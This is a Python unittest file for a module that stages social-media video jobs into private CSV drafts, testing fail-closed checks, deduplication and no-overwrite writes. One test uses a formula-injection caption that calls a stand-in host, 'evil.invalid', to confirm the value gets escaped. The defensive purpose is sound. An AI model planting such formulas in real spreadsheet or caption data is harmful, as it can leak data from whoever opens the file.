import csv
import importlib.util
from pathlib import Path
import tempfile
import unittest

module_path = Path(__file__).parents[1] / "shortfactory_social_stage.py"
if not module_path.is_file():
    module_path = Path(__file__).with_name("shortfactory_social_stage.py")  # local ShortFactory layout
spec = importlib.util.spec_from_file_location("bridge", module_path)
b = importlib.util.module_from_spec(spec)
spec.loader.exec_module(b)

class BridgeTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.base = Path(self.tmp.name)
        self.video = self.base / "owned.mp4"
        self.video.write_bytes(b"local reviewed fixture")
        self.item = {
            "job_id": "my_job_12", "platform": "youtube_shorts",
            "approved": True, "file_path": str(self.video),
            "caption": "Our original HEMA video",
            "rights_status": "owned", "status": "WAITING_EXTERNAL_PUBLISHER",
            "evidence_required": ["post_id", "post_url", "published_at"],
        }

    def test_real_manifest_produces_draft_never_approval_or_upload(self):
        rows = b.stage({"items": [self.item]}, "DRUZINA_ZS")
        r = rows[0]
        self.assertEqual(list(r), b.HEADERS)
        self.assertEqual(r["Job_ID"], "SF-my_job_12:youtube_shorts")
        self.assertEqual(r["Status"], "DRAFT")
        self.assertEqual(r["Visibility"], "private")
        self.assertEqual(r["Entity"], "DRUZINA_ZS")
        for field in ("Duplicate_Checked", "Rights_OK", "Approved_At", "Media_URL",
                      "Video_Drive_ID", "Post_URL", "Post_ID", "Scheduled_At", "Made_For_Kids"):
            self.assertFalse(r[field], field)
        self.assertNotIn(str(self.video), str(r))

    def test_no_rights_no_approval_no_file_or_bad_account_all_fail_closed(self):
        for change in ({"rights_status": "unknown"}, {"approved": False},
                       {"status": "PUBLISHED"}, {"file_path": "missing.mp4"},
                       {"platform": "unknown"}, {"evidence_required": []}):
            with self.subTest(change=change), self.assertRaises(ValueError):
                b.stage({"items": [dict(self.item, **change)]}, "OSVC")
        with self.assertRaises(ValueError):
            b.stage({"items": [self.item]}, "INFER_ENTITY")

    def test_deduplicate_and_never_overwrite(self):
        with self.assertRaises(ValueError):
            b.stage({"items": [self.item, dict(self.item)]}, "OSVC")
        dest = self.base / "stage.csv"
        rows = b.stage({"items": [self.item]}, "OSVC")
        b.write(rows, dest)
        with self.assertRaises(FileExistsError):
            b.write(rows, dest)
        with dest.open(encoding="utf-8-sig", newline="") as f:
            self.assertEqual(list(csv.DictReader(f))[0]["Status"], "DRAFT")

    def test_caption_formula_injection_blocked(self):
        obj = dict(self.item, caption='=IMPORTXML("https://evil.invalid","/")')
        self.assertTrue(b.stage({"items": [obj]}, "OSVC")[0]["Caption"].startswith("'="))

if __name__ == "__main__":
    unittest.main()
